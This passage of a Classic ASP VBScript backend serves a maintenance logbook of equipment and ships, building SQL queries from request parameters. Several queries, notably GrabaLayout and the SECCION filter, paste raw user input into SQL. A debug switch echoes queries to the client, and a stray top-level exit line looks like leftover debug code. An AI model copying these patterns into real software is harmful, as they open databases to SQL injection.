<%@LANGUAGE="VBSCRIPT" CODEPAGE="1252"%>

	
	
<!-- 
METADATA 
TYPE="typelib" 
UUID="CD000000-8B95-11D1-82DB-00C04FB1625D" 
NAME="CDO for Windows 2000 Library" 
--> 

<!--#include file="DBConn.asp" -->
<%
Dim query, ID
Dim oDB
   
     response.write "hola"
   exit function
   
Set oDB = New DBConn

 
   
Session.LCID = 11274

RECURSO=REQUEST("RECURSO")
PRUEBA=REQUEST("PRUEBA")
ID=UCASE(REQUEST("ID"))
COMBUSTIBLE=UCASE(REQUEST("COMBUSTIBLE"))
CAUSA=UCASE(REQUEST("CAUSA"))
ACCION=UCASE(REQUEST("ACCION"))
ESTATUS=UCASE(REQUEST("ESTATUS"))
EJECUTOR=UCASE(REQUEST("EJECUTOR"))
CRITICIDAD=UCASE(REQUEST("CRITICIDAD"))
SECCION=UCASE(REQUEST("SECCION"))
CONDICION=UCASE(REQUEST("CONDICION"))
COLOR=UCASE(REQUEST("COLOR"))
VALOR_COMBUSTIBLE=UCASE(REQUEST("VALOR_COMBUSTIBLE"))
DOC_COMBUSTIBLE=UCASE(REQUEST("DOC_COMBUSTIBLE"))
DESC_SECCION=UCASE(REQUEST("DESC_SECCION"))
FOLIO_OT=UCASE(REQUEST("FOLIO_OT"))
FECHA=UCASE(REQUEST("FECHA"))
FECHA_INI=UCASE(REQUEST("FECHA_INI"))
FECHA_FIN=UCASE(REQUEST("FECHA_FIN"))
ULT_INSPECCION=UCASE(REQUEST("ULT_INSPECCION"))
INICIO=UCASE(REQUEST("INICIO"))
TERMINO=UCASE(REQUEST("TERMINO"))
FAENA=UCASE(REQUEST("FAENA"))
NAVE=UCASE(REQUEST("NAVE"))
STR=UCASE(REQUEST("STR"))
REPORT=UCASE(REQUEST("REPORT"))
RESPONSABLE=REQUEST("RESPONSABLE")
RECOMENDACION=REQUEST("RECOMENDACION")
TURNO=UCASE(REQUEST("TURNO"))
SUPERVISOR=UCASE(REQUEST("SUPERVISOR"))
OPERADOR_NAVE=UCASE(REQUEST("OPERADOR_NAVE"))
OPERADOR_GRUA=UCASE(REQUEST("OPERADOR_GRUA"))
OT=UCASE(REQUEST("OT"))
OBSERVACION=UCASE(REQUEST("OBSERVACION"))

EQUIPO_PRIN=UCASE(REQUEST("EQUIPO_PRIN"))
NUM=UCASE(REQUEST("NUM"))
DANO=UCASE(REQUEST("DANO"))
TIPO_TURNO=UCASE(REQUEST("TIPO_TURNO"))
TIPO=UCASE(REQUEST("TIPO"))
TURNO=UCASE(REQUEST("TURNO"))
EQUIPO=UCASE(REQUEST("EQUIPO"))
ESTADO=UCASE(REQUEST("ESTADO"))
EXCEL=UCASE(REQUEST("EXCEL"))
FECHA_PROGRAMADA=UCASE(REQUEST("FECHA_PROGRAMADA"))
USUARIO=UCASE(REQUEST("USUARIO"))
CINTA=UCASE(REQUEST("CINTA"))
MES=UCASE(REQUEST("MES"))
USERNAME=REQUEST("USERNAME")
DESCRIPCION=REQUEST("DESCRIPCION")
IND_DANO=UCASE(REQUEST("IND_DANO"))
IND_INCIDENTE=UCASE(REQUEST("IND_INCIDENTE"))
IND_SOLUCION=UCASE(REQUEST("IND_SOLUCION"))
PRIORIDAD=UCASE(REQUEST("PRIORIDAD"))
PLANTA=UCASE(REQUEST("PLANTA"))
ESTADO=UCASE(REQUEST("ESTADO"))
IMG=UCASE(REQUEST("IMG"))
ULT_MOD_OBS=UCASE(REQUEST("ULT_MOD_OBS"))
SW=UCASE(REQUEST("SW"))
COD_ESTOCADA=UCASE(REQUEST("COD_ESTOCADA"))
COD_MESA=UCASE(REQUEST("COD_MESA"))
RANX=UCASE(REQUEST("RANX"))

select case RECURSO
	case "GetBitacora"
		GetBitacora()
		
	case "GetAllLayout"
		GetAllLayout()
		
	case "GrabaLayout"
		GrabaLayout()

	case "NewBitacora"
		NewBitacora()
		
	case "InsertCintaBitacora"
		 InsertCintaBitacora()

 	case "DelCintaBitacora"
		 DelCintaBitacora()

  	case "getPlanData"
		 getPlanData()
		 
	case "getLayout"
		  getLayout()

	case "getLayout2"
		  getLayout2()

	case "getLayout3"
		  getLayout3()

	case "getLayoutSec"
		  getLayoutSec()

	case "UpdateBitacora"
		UpdateBitacora()
		
	case "UpdateBitacoraDetalles"
		UpdateBitacoraDetalles()

	case "updatePlanData"
		updatePlanData()
		
	case "ListBitacora"
		ListBitacora()
	
	case "ListBitacoraID"
		  ListBitacoraID()
	
	case "listEquiposAlta"
		listEquiposAlta()
		
	case "InfSemInspec"
	      InfSemInspec()
	
	case "InfDiaInspec"
	      InfDiaInspec()
	
	case "InfDiaA"
	      InfDiaA()
		  	  
	case "ListEquiposBitacoras"
		ListEquiposBitacora()
		
	case "ListEquiposPrinUsuarioBitacora"
		ListEquiposPrinUsuarioBitacora()

	case "ListIncidentes"
		ListIncidentes()
		
	case "ListIncidentesOT"
		ListIncidentesOT()
	
	case "ListNaves"
		ListNaves()

	case "LayoutFaena"
		LayoutFaena()
		
	case "updateMod_Obs"
		updateMod_Obs()

	case "LayoutFaenaPlanta"
		LayoutFaenaPlanta()
		
	case "ListBitacoraAndina"
		ListBitacoraAndina()
		
	case "LayoutFaenaALL"
		LayoutFaenaALL()	
		
	case "InfBitPolines"
		InfBitPolines()		
		
	case "InfBitPolinesSinxsl"
		InfBitPolinesSinxsl()						
		
end select

function NewBitacora()

	query = "SELECT MAX(ID) AS N FROM BITACORAS"
	Set ORs =oDB.EjecutaSql(query)
	
	If Len(oRS("N"))>0 Then
		N = oRS("N") + 1
	Else
		N = 1
	End If
	
	
	query = "INSERT INTO BITACORAS (ID, FECHA, TURNO, EJECUTOR,  RESPONSABLE, DANO, "
	query = query & " DESCRIPCION, ESTADO, EQUIPO, REPORT, NAVE, TIPO_TURNO, ULT_INSPECCION,"
	query = query & " IND_INCIDENTE, IND_DANO, UBICACION, VALOR_COMBUSTIBLE, CAUSA, RECOMENDACION,"
	query = query & " IND_SOLUCION, PRIORIDAD, COLOR, CRITICIDAD, FECHA_PROGRAMADA, OT, CONDICION, "
	query = query & " OBSERVACION, STATUS) VALUES ("
	query = query & N & "," 
	query = query & strNvl(FECHA) & ","
	query = query & strNvl(TURNO) & ","
	query = query & strNvl(EJECUTOR) & ","
	query = query & strNvl(USERNAME) & ","
	query = query & strNvl(DANO) & ","
	query = query & strNvl(DESCRIPCION) & ","
	query = query & "'ING',"
	query = query & strNvl(EQUIPO) & ","
	query = query & strNvl(REPORT) & ","
	query = query & strNvl(NAVE) & ","
	query = query & strNvl(TIPO_TURNO) & ","
	query = query & strNvl(ULT_INSPECCION) & ","
	query = query & strNvl(IND_INCIDENTE) & ","
	query = query & strNvl(IND_DANO) & ","
	query = query & strNvl(FAENA) & ","
	query = query & strNvl(VALOR_COMBUSTIBLE) & ","
	query = query & strNvl(CAUSA) & ","
	query = query & strNvl(RECOMENDACION) & ","
	query = query & strNvl(IND_SOLUCION) & ","
	query = query & strNvl(PRIORIDAD) & ","
	query = query & strNvl(COLOR) & ","
	query = query & strNvl(CRITICIDAD) & ","
	query = query & strNvl(FECHA_PROGRAMADA) & ","
	query = query & strNvl(OT) & ","
	query = query & strNvl(CONDICION) & ","
	query = query & strNvl(OBSERVACION) & ","
	query = query & strNvl(ESTATUS) & ");"	
		
	Set ORs =oDB.EjecutaSql(query)
	
	
	query = "INSERT INTO dbo.HISTORIAL_BITACORA (ID, INSPECTOR, FECHA, STATUS, USERDATE, USERNAME, ORDEN) VALUES ("
	query = query & N & "," 
	query = query & strNvl(USERNAME) & ","
	query = query & strNvl(FECHA) & ","
	query = query & "0,"
	query = query & strNvl(FECHA) & ","
	query = query & strNvl(USERNAME) & ", 0);"	
	Set ORs =oDB.EjecutaSql(query)

	
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	Response.Write "<ID>" & N  & "</ID>"
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set oDB = Nothing
	
	ID = N
	newMailBitacora()
	
end function

function ListBitacora()


	query = "SELECT B.ID,"
	query = query & " rtrim(Convert(char,b.fecha, 103)) + ' ' + 	"
	query = query & " substring(Convert(char,b.fecha, 108),1,5) as FECHA, "
	query = query & " TURNO, B.RESPONSABLE,"
	query = query & " B.DESCRIPCION, B.ESTADO, B.IND_INCIDENTE, B.TIPO_TURNO, "
	query = query & " B.EQUIPO, B.IND_DANO, B.COLOR, B.CAUSA, B.IND_SOLUCION,"
	query = query & " DATEDIFF(d,B.FECHA,GETDATE()), DBO.EquipoPrincipal(B.EQUIPO),"
	query = query & " RECOMENDACION, B.CRITICIDAD, E.GCODE, E.X, E.Y, B.EJECUTOR "
	query = query & " FROM BITACORAS AS B "
	'query = query & " INNER JOIN EQUIPOS_USUARIOS AS EU ON "
	'query = query & " DBO.EQUIPOPRINCIPALFAENA(B.EQUIPO,B.UBICACION) = EU.EQUIPO AND EU.USUARIO=" & strNvl(USUARIO)
	query = query & " LEFT OUTER JOIN EQUIPOS AS E ON B.EQUIPO = E.CODIGO AND E.UBICACION = B.UBICACION "
	query = query & " WHERE (CONVERT(DATETIME,CONVERT(CHAR,B.FECHA,103)) BETWEEN " & strNvl(FECHA_INI)
	query = query & " AND DATEADD(d,1," & strNvl(FECHA_FIN) & "))"
	query = query & " AND  B.UBICACION=" & strNvl(FAENA)
	
	If RESPONSABLE<>"TOD" AND LEN(RESPONSABLE)>0 Then
		query = query & " AND B.RESPONSABLE =" & strNvl(RESPONSABLE)
	End if
	
	'If TURNO<>"TOD" Then'
	'	query = query & " AND TURNO=" & strNvl(TURNO)'
'	End if'
	
	If EQUIPO<>"TOD"  Then
		If strNvl(EQUIPO)="NULL" Then
				query = query & " AND B.EQUIPO IS NULL"
		Else
			if IMG = 1 Then		
				query = query & " AND SUBSTRING(E.LAYOUT, 0, LEN(E.LAYOUT)-3)=" & strNvl(EQUIPO)
			else
				query = query & " AND RTRIM(B.EQUIPO)=" & strNvl(EQUIPO)
			End if
		End If	
	End if
	
	If EQUIPO_PRIN<>"TOD" AND LEN(EQUIPO_PRIN)>0 Then
			query = query & " AND DBO.EQUIPOPRINCIPALFAENA(B.EQUIPO,B.UBICACION)=" & strNvl(EQUIPO_PRIN)
		
	ELSE
			If SECCION<>"'TOD'" AND LEN(SECCION)>0 Then
'				query = query & " AND DBO.SecEquipoPrincipal(B.EQUIPO) IN (" & SECCION & ")"
				query = query & " AND E.SECCION IN (" & SECCION & ")"				
			End if
	End if
	
	If CRITICIDAD<>"TOD"  Then
		query = query & " AND B.COLOR=" & strNvl(CRITICIDAD)
	End if
	
	If IND_DANO<>"TOD" Then
		query = query & " AND IND_DANO=" & strNvl(IND_DANO)
	End if

	If IND_SOLUCION<>"TOD" Then
		query = query & " AND IND_SOLUCION=" & strNvl(IND_SOLUCION)
	End if
	
	If LEN(ID)>0  Then
		query = query & " AND ID=" & strNvl(ID)
	End if

	
	query = query & " GROUP BY B.ID,B.FECHA, TURNO, B.RESPONSABLE, B.DESCRIPCION, B.ESTADO, B.IND_INCIDENTE,"
	query = query & " B.TIPO_TURNO,B.EQUIPO, B.IND_DANO, B.COLOR, B.CAUSA, B.IND_SOLUCION, "
	query = query & " RECOMENDACION, B.CRITICIDAD, E.GCODE, X, Y, EJECUTOR"
	query = query & " ORDER BY B.FECHA DESC, DBO.EQUIPOPRINCIPAL(B.EQUIPO) ASC  "
	
	IF PRUEBA="SI" THEN
		response.write query
		response.End()
	END IF
	
	Set ORs =oDB.EjecutaSql(query)
	
	Dim strName

	strName = Date()
	strName = Replace(strName, "/", "") ' "/" Your local dateseparator?
	'strName = strName & ".xls"
	
	IF EXCEL="YES" THEN	
		Response.Buffer = True
		Response.ContentType = "application/vnd.ms-excel"
		Response.AddHeader "Content-Disposition", "attachment;filename=" & strName 
		
		
		Response.Write "<?xml version='1.0' encoding='UTF-8' standalone='no' ?>" 
		Response.Write "<?xml-stylesheet  type='text/xsl' href='equiposRiesgo.xsl?X=34'?>" & VbCrLf & VbCrLf
	ELSE
		Response.ContentType = "text/xml"
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' ?>" & VbCrLf & VbCrLf
	END IF
	
	Response.Write "<REGISTROS>" '& query'
	N=0
	While Not ORs.EOF 
		N=N+1
	  Response.Write "<ROW>" 
	  	Response.Write "<N>" & N & "</N>"
		  Response.Write "<ID>" & ORs.Fields.Item(0).Value & "</ID>"
		  Response.Write "<FECHA>" & ORs.Fields.Item(1).Value & "</FECHA>"
  		  Response.Write "<TURNO>" & ORs.Fields.Item(2).Value & "</TURNO>"
   		  Response.Write "<RESPONSABLE>" & ORs.Fields.Item(3).Value & "</RESPONSABLE>"
   		  Response.Write "<DESCRIPCION>" & ORs.Fields.Item(4).Value & "</DESCRIPCION>"
  		  Response.Write "<ESTADO>" & ORs.Fields.Item(5).Value & "</ESTADO>"
		  Response.Write "<IND_INCIDENTE>" & ORs.Fields.Item(6).Value & "</IND_INCIDENTE>"
		  IF ORs.Fields.Item(7).Value ="SER" THEN
	  		  Response.Write "<TIPO_TURNO>SERVICIO</TIPO_TURNO>"
			ELSE
			  Response.Write "<TIPO_TURNO>MANTENCION</TIPO_TURNO>"
		  END IF
  		  Response.Write "<EQUIPO>" & ORs.Fields.Item(8).Value & "</EQUIPO>"
		  Response.Write "<IND_DANO>" & ORs.Fields.Item(9).Value & "</IND_DANO>"
		  Response.Write "<COLOR>" & ORs.Fields.Item(10).Value & "</COLOR>"
		  Response.Write "<CAUSA>" & ORs.Fields.Item(11).Value & "</CAUSA>"
		  Response.Write "<IND_SOLUCION>" & ORs.Fields.Item(12).Value & "</IND_SOLUCION>"
		  Response.Write "<DIAS>" & ORs.Fields.Item(13).Value & "</DIAS>"
		  Response.Write "<EQUIPO_PRIN>" & ORs.Fields.Item(14).Value & "</EQUIPO_PRIN>"
		  Response.Write "<RECOMENDACION>" & ORs.Fields.Item(15).Value & "</RECOMENDACION>"
		  Response.Write "<CRITICIDAD>" & ORs.Fields.Item(16).Value & "</CRITICIDAD>" 
		  
		  Response.Write "<GCODE>" & ORs.Fields.Item(17).Value & "</GCODE>" 
		  Response.Write "<X>" & ORs.Fields.Item(18).Value & "</X>" 
		  Response.Write "<Y>" & ORs.Fields.Item(19).Value & "</Y>" 
		  Response.Write "<EJECUTOR>" & ORs.Fields.Item(20).Value & "</EJECUTOR>" 
		  
		 Set oRsFiles = getFiles(ORs.Fields.Item(0).Value)
		  If Not oRsFiles.EOF Then
		  		If EXCEL = "YES" Then
					Response.Write "<FILE>../Files/" & ORsFiles.Fields.Item(0).Value & "</FILE>"
				Else
		  			Response.Write "<FILE>Files/" & ORsFiles.Fields.Item(0).Value & "</FILE>"
				End If
		  Else
		  		If EXCEL = "YES" Then
					Response.Write "<FILE>../images/noDisponible.png</FILE>"
				Else
		  			Response.Write "<FILE>images/noDisponible.png</FILE>"
				End If
				
		  End If 
	  Response.Write "</ROW>"
	  ORs.MoveNext 
	Wend
	'Response.Write "<sql>" & query & "</sql>"'
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ORsFiles = Nothing
	Set ODB = Nothing
end function


function ListBitacoraID()

	query = "SELECT B.ID,"
	query = query & "rtrim(convert(char,b.fecha,103)) + ' ' + "
	query = query & " substring(convert(char,b.fecha,108),1,5) as FECHA, "
	query = query & " TURNO, B.RESPONSABLE,"
	query = query & " B.DESCRIPCION, B.ESTADO, B.IND_INCIDENTE, B.TIPO_TURNO, "
	query = query & " B.EQUIPO, B.IND_DANO, B.COLOR, B.CAUSA, B.IND_SOLUCION,"
	query = query & " DATEDIFF(d,B.FECHA,GETDATE()), DBO.EquipoPrincipal(B.EQUIPO),"
	query = query & " RECOMENDACION, B.CRITICIDAD, E.GCODE, E.X, E.Y "
	query = query & " FROM BITACORAS AS B "
	query = query & " INNER JOIN EQUIPOS_USUARIOS AS EU ON "
	query = query & " DBO.EquipoPrincipal(B.EQUIPO) = EU.EQUIPO "
	query = query & " LEFT OUTER JOIN EQUIPOS AS E ON B.EQUIPO = E.CODIGO AND E.UBICACION = B.UBICACION "
	query = query & " WHERE ID =" & strNvl(ID)
	query = query & " AND  B.UBICACION=" & strNvl(FAENA)
	
	query = query & " GROUP BY B.ID,B.FECHA, TURNO, B.RESPONSABLE, B.DESCRIPCION, B.ESTADO, B.IND_INCIDENTE,"
	query = query & " B.TIPO_TURNO,B.EQUIPO, B.IND_DANO, B.COLOR, B.CAUSA, B.IND_SOLUCION, "
	query = query & " RECOMENDACION, B.CRITICIDAD, E.GCODE, X, Y "
	query = query & " ORDER BY DBO.EQUIPOPRINCIPAL(B.EQUIPO), convert(char,B.fecha,101) DESC  "
	
	Set ORs =oDB.EjecutaSql(query)
	
	Dim strName

	strName = Date()
	strName = Replace(strName, "/", "") ' "/" Your local dateseparator?
	'strName = strName & ".xls"
	
	
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15' ?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>" '& query
	N=0
	While Not ORs.EOF 
		N=N+1
	  Response.Write "<ROW>" 
	  	Response.Write "<N>" & N & "</N>"
		  Response.Write "<ID>" & ORs.Fields.Item(0).Value & "</ID>"
		  Response.Write "<FECHA>" & ORs.Fields.Item(1).Value & "</FECHA>"
  		  Response.Write "<TURNO>" & ORs.Fields.Item(2).Value & "</TURNO>"
   		  Response.Write "<RESPONSABLE>" & ORs.Fields.Item(3).Value & "</RESPONSABLE>"
   		  Response.Write "<DESCRIPCION>" & ORs.Fields.Item(4).Value & "</DESCRIPCION>"
  		  Response.Write "<ESTADO>" & ORs.Fields.Item(5).Value & "</ESTADO>"
		  Response.Write "<IND_INCIDENTE>" & ORs.Fields.Item(6).Value & "</IND_INCIDENTE>"
		  IF ORs.Fields.Item(7).Value ="SER" THEN
	  		  Response.Write "<TIPO_TURNO>SERVICIO</TIPO_TURNO>"
			ELSE
			  Response.Write "<TIPO_TURNO>MANTENCION</TIPO_TURNO>"
		  END IF
  		  Response.Write "<EQUIPO>" & ORs.Fields.Item(8).Value & "</EQUIPO>"
		  Response.Write "<IND_DANO>" & ORs.Fields.Item(9).Value & "</IND_DANO>"
		  Response.Write "<COLOR>" & ORs.Fields.Item(10).Value & "</COLOR>"
		  Response.Write "<CAUSA>" & ORs.Fields.Item(11).Value & "</CAUSA>"
		  Response.Write "<IND_SOLUCION>" & ORs.Fields.Item(12).Value & "</IND_SOLUCION>"
		  Response.Write "<DIAS>" & ORs.Fields.Item(13).Value & "</DIAS>"
		  Response.Write "<EQUIPO_PRIN>" & ORs.Fields.Item(14).Value & "</EQUIPO_PRIN>"
		  Response.Write "<RECOMENDACION>" & ORs.Fields.Item(15).Value & "</RECOMENDACION>"
		  Response.Write "<CRITICIDAD>" & ORs.Fields.Item(16).Value & "</CRITICIDAD>" 
		  
		  Response.Write "<GCODE>" & ORs.Fields.Item(17).Value & "</GCODE>" 
		  Response.Write "<X>" & ORs.Fields.Item(18).Value & "</X>" 
		  Response.Write "<Y>" & ORs.Fields.Item(19).Value & "</Y>" 
		  
		 Set oRsFiles = getFiles(ORs.Fields.Item(0).Value)
		  If Not oRsFiles.EOF Then
		  		If EXCEL = "YES" Then
					Response.Write "<FILE>../Files/" & ORsFiles.Fields.Item(0).Value & "</FILE>"
				Else
		  			Response.Write "<FILE>Files/" & ORsFiles.Fields.Item(0).Value & "</FILE>"
				End If
		  Else
		  		If EXCEL = "YES" Then
					Response.Write "<FILE>../images/noDisponible.png</FILE>"
				Else
		  			Response.Write "<FILE>images/noDisponible.png</FILE>"
				End If
				
		  End If 
	  Response.Write "</ROW>"
	  ORs.MoveNext 
	Wend
	'Response.Write "<sql>" & query & "</sql>"'
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ORsFiles = Nothing
	Set ODB = Nothing
end function

function GetAllLayout()

	query = "SELECT distinct CASE WHEN E.COD_EQUIPO_PADRE = DBO.EquipoPrincipal(E.CODIGO) "
	query = query & " THEN E.CODIGO ELSE E.COD_EQUIPO_PADRE END as CODIGO "
	query = query & " , DBO.EquipoPrincipal(E.CODIGO) AS PRINCIPAL,E.GCODE, E.LAYOUT, E.X, E.Y, 'ALTA' AS COLOR "
	query = query & " , E.Z, E.SCALEX, E.SCALEY"
	query = query & " FROM EQUIPOS AS E "
	query = query & " WHERE E.UBICACION="&strNvl(FAENA)
	query = query & " AND DBO.EquipoPrincipal(E.CODIGO)="&strNvl(EQUIPO_PRIN)
	
	Set ORs =oDB.EjecutaSql(query)
	
	Dim strName

	strName = Date()
	strName = Replace(strName, "/", "") ' "/" Your local dateseparator?
	'strName = strName & ".xls"
	
	IF EXCEL="YES" THEN	
		Response.Buffer = True
		Response.ContentType = "application/vnd.ms-excel"
		Response.AddHeader "Content-Disposition", "attachment;filename=" & strName 
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' standalone='no' ?>" 
		Response.Write "<?xml-stylesheet  type='text/xsl' href='equiposRiesgo.xsl?X=34'?>" & VbCrLf & VbCrLf
	ELSE
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' ?>" & VbCrLf & VbCrLf
	END IF
	
	Response.Write "<REGISTROS>" '& query'
	N=0
	equipoValor = ""
	While Not ORs.EOF 
		'if ORs.Fields.Item(0).Value <> equipoValor THEN'
			N=N+1
			Response.Write "<ROW>" 
			Response.Write "<N>" & N & "</N>"
			Response.Write "<EQUIPO>" & ORs.Fields.Item(0).Value & "</EQUIPO>"
			Response.Write "<EQUIPO_PRIN>" & ORs.Fields.Item(1).Value & "</EQUIPO_PRIN>"
			Response.Write "<GCODE>" & ORs.Fields.Item(2).Value & "</GCODE>" 
			Response.Write "<LAYOUT>" & ORs.Fields.Item(3).Value & "</LAYOUT>" 
			Response.Write "<X>" & ORs.Fields.Item(4).Value & "</X>" 
			Response.Write "<Y>" & ORs.Fields.Item(5).Value & "</Y>" 
			Response.Write "<COLOR>" & ORs.Fields.Item(6).Value & "</COLOR>"
			Response.Write "<Z>" & ORs.Fields.Item(7).Value & "</Z>"
			Response.Write "<SCALEX>" & ORs.Fields.Item(8).Value & "</SCALEX>"
			Response.Write "<SCALEY>" & ORs.Fields.Item(9).Value & "</SCALEY>"
			Response.Write "</ROW>"
		'End if'
		equipoValor = ORs.Fields.Item(0).Value
	  ORs.MoveNext 
	Wend
	Response.Write "</REGISTROS>"
	Set ORs = Nothing
	Set ORsFiles = Nothing
	Set ODB = Nothing
end function

function GrabaLayout()
	query = ""
	variables=split(request("variables"),";")
	data=split(request("data"),";")
	Response.Write "<?xml version='1.0' encoding='ISO-8859-15'?>" & VbCrLf & VbCrLf
	Response.Write "<REGISTROS>"
	for count = 0 to UBound(variables)
		miVars = split(variables(count),",")		
		miData = split(data(count),",")	
		if 	miData(0)<> miVars(1) or miData(1)<>miVars(2) then
			query = "UPDATE EQUIPOS SET X="&miData(0)&", Y="& miData(1)&", SCALEX="& miData(2)&", SCALEY="& miData(3)
			query = query & " WHERE  UBICACION='"					& FAENA 		& "'"
			query = query & " AND DBO.EquipoPrincipal(CODIGO)=DBO.EquipoPrincipal('"	& miVars(0) &"')"
			query = query & " AND X="								& miVars(1)
			query = query & " AND Y="								& miVars(2)
			query = query & " AND Z="								& miVars(3)
			query = query & " AND LAYOUT='"							& miVars(4)		& "'"
			query = query & " AND SCALEX="							& miVars(5)
			query = query & " AND SCALEY="							& miVars(6)
	
			Response.Write "<sql>"&query&"</sql>"
			Set ORs =oDB.EjecutaSql(query)
			Set ORs = Nothing
		end if
	next
	
	Response.Write "OK"
	Response.Write "</REGISTROS>"


	Set oDB = Nothing
end function

function listEquiposAlta()

	query = "SELECT B.ID,"
	query = query & "rtrim(convert(char,b.fecha,103)) + ' ' + "
	query = query & " substring(convert(char,b.fecha,108),1,5) as FECHA, "
	query = query & " TURNO, B.RESPONSABLE,"
	query = query & " B.DESCRIPCION, B.ESTADO, B.IND_INCIDENTE, B.TIPO_TURNO, "
	query = query & " B.EQUIPO, B.IND_DANO, B.COLOR, B.CAUSA, B.IND_SOLUCION,"
	query = query & " DATEDIFF(d,B.FECHA,GETDATE()), DBO.EquipoPrincipal(B.EQUIPO),"
	query = query & " RECOMENDACION, B.CRITICIDAD, E.GCODE, E.X, E.Y, B.EJECUTOR "
	query = query & " FROM BITACORAS AS B "
	query = query & " INNER JOIN EQUIPOS_USUARIOS AS EU ON "
	query = query & " DBO.EQUIPOPRINCIPALFAENA(B.EQUIPO,B.UBICACION) = EU.EQUIPO AND EU.USUARIO=" & strNvl(USUARIO)
	query = query & " INNER JOIN EQUIPOS AS E ON B.EQUIPO = E.CODIGO AND E.UBICACION = B.UBICACION "
	query = query & " INNER JOIN EQUIPOS AS E1 ON E1.CODIGO = DBO.EQUIPOPRINCIPALFAENA(B.EQUIPO,B.UBICACION) "
	query = query & "     AND E1.TIPO_EQUIPO<>17"
	query = query & " WHERE (CONVERT(DATETIME,CONVERT(CHAR,B.FECHA,103)) BETWEEN " & strNvl(FECHA_INI)
	query = query & " AND DATEADD(d,1," & strNvl(FECHA_FIN) & "))"
	query = query & " AND  B.UBICACION=" & strNvl(FAENA)
	
	If RESPONSABLE<>"TOD" AND LEN(RESPONSABLE)>0 Then
		query = query & " AND B.RESPONSABLE =" & strNvl(RESPONSABLE)
	End if
	
	'If TURNO<>"TOD" Then'
	'	query = query & " AND TURNO=" & strNvl(TURNO)'
'	End if'
	
	If EQUIPO<>"TOD"  Then
		If strNvl(EQUIPO)="NULL" Then
				query = query & " AND B.EQUIPO IS NULL"
		Else		
			query = query & " AND RTRIM(B.EQUIPO)=" & strNvl(EQUIPO)
		End If	
	End if
	
	If EQUIPO_PRIN<>"TOD" AND LEN(EQUIPO_PRIN)>0 Then
		query = query & " AND DBO.EQUIPOPRINCIPALFAENA(B.EQUIPO,B.UBICACION)=" & strNvl(EQUIPO_PRIN)
		
	ELSE
			If SECCION<>"'TOD'" AND LEN(SECCION)>0 Then
				query = query & " AND DBO.SecEquipoPrincipal(B.EQUIPO) IN (" & SECCION & ")"
			End if
	End if
	
	If CRITICIDAD<>"TOD"  Then
		query = query & " AND B.COLOR=" & strNvl(CRITICIDAD)
	End if
	
	If LEN(TIPO)>0 Then
		query = query & " AND E.TIPO_EQUIPO=" & strNvl(TIPO)
	End if
	
	If IND_DANO<>"TOD" Then
		query = query & " AND IND_DANO=" & strNvl(IND_DANO)
	End if

	If IND_SOLUCION<>"TOD" Then
		query = query & " AND IND_SOLUCION=" & strNvl(IND_SOLUCION)
	End if
	
	
	query = query & " GROUP BY B.ID,B.FECHA, TURNO, B.RESPONSABLE, B.DESCRIPCION, B.ESTADO, B.IND_INCIDENTE,"
	query = query & " B.TIPO_TURNO,B.EQUIPO, B.IND_DANO, B.COLOR, B.CAUSA, B.IND_SOLUCION, "
	query = query & " RECOMENDACION, B.CRITICIDAD, E.GCODE, E.X, E.Y, EJECUTOR"
	query = query & " ORDER BY DBO.EQUIPOPRINCIPAL(B.EQUIPO), B.FECHA DESC  "
	
	Set ORs =oDB.EjecutaSql(query)
	
	Dim strName

	strName = Date()
	strName = Replace(strName, "/", "") ' "/" Your local dateseparator?
	'strName = strName & ".xls"
	
	IF EXCEL="YES" THEN	
		Response.Buffer = True
		Response.ContentType = "application/vnd.ms-excel"
		Response.AddHeader "Content-Disposition", "attachment;filename=" & strName 
		
		
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' standalone='no' ?>" 
		Response.Write "<?xml-stylesheet  type='text/xsl' href='equiposRiesgo.xsl?X=34'?>" & VbCrLf & VbCrLf
	ELSE
		Response.ContentType = "text/xml"
		Response.Write "<?xml version='1.0' encoding='ISO-8859-15' ?>" & VbCrLf & VbCrLf
	END IF
	
	Response.Write "<REGISTROS>" '& query'
	N=0
	While Not ORs.EOF 
		N=N+1
	  Response.Write "<ROW>" 
	  	Response.Write "<N>" & N & "</N>"
		  Response.Write "<ID>" & ORs.Fields.Item(0).Value & "</ID>"
		  Response.Write "<FECHA>" & ORs.Fields.Item(1).Value & "</FECHA>"
  		  Response.Write "<TURNO>" & ORs.Fields.Item(2).Value & "</TURNO>"
   		  Response.Write "<RESPONSABLE>" & ORs.Fields.Item(3).Value & "</RESPONSABLE>"
   		  Response.Write "<DESCRIPCION>" & ORs.Fields.Item(4).Value & "</DESCRIPCION>"
  		  Response.Write "<ESTADO>" & ORs.Fields.Item(5).Value & "</ESTADO>"
		  Response.Write "<IND_INCIDENTE>" & ORs.Fields.Item(6).Value & "</IND_INCIDENTE>"
		  IF ORs.Fields.Item(7).Value ="SER" THEN
	  		  Response.Write "<TIPO_TURNO>SERVICIO</TIPO_TURNO>"
			ELSE
			  Response.Write "<TIPO_TURNO>MANTENCION</TIPO_TURNO>"
		  END IF
  		  Response.Write "<EQUIPO>" & ORs.Fields.Item(8).Value & "</EQUIPO>"
		  Response.Write "<IND_DANO>" & ORs.Fields.Item(9).Value & "</IND_DANO>"
		  Response.Write "<COLOR>" & ORs.Fields.Item(10).Value & "</COLOR>"
		  Response.Write "<CAUSA>" & ORs.Fields.Item(11).Value & "</CAUSA>"
		  Response.Write "<IND_SOLUCION>" & ORs.Fields.Item(12).Value & "</IND_SOLUCION>"
		  Response.Write "<DIAS>" & ORs.Fields.Item(13).Value & "</DIAS>"
		  Response.Write "<EQUIPO_PRIN>" & ORs.Fields.Item(14).Value & "</EQUIPO_PRIN>"
		  Response.Write "<RECOMENDACION>" & ORs.Fields.Item(15).Value & "</RECOMENDACION>"
		  Response.Write "<CRITICIDAD>" & ORs.Fields.Item(16).Value & "</CRITICIDAD>" 
		  
		  Response.Write "<GCODE>" & ORs.Fields.Item(17).Value & "</GCODE>" 
		  Response.Write "<X>" & ORs.Fields.Item(18).Value & "</X>" 
